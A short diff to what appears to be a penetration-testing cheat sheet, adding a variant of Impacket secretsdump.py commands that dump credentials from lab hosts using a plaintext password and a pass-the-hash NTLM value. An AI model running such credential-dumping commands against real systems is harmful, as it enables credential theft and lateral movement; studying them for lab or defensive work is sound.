@@ -104,6 +104,9 @@ python3 secretsdump.py zeus.corp/Eric.Wallows:EricLikesRunning800@192.168.158.15
 
 # Pass-the-Hash version
 python3 secretsdump.py zeus.corp/Administrator@192.168.158.159 -hashes :a1fcb4118dfcbf52a53d6299aab57055
+
+# Without Domain
+python3 secretsdump.py 'Eric.Wallows:EricLikesRunning800@192.168.107.163'
 ```
 
 ### MODE 2: LOCAL — parse files you already downloaded to Kali
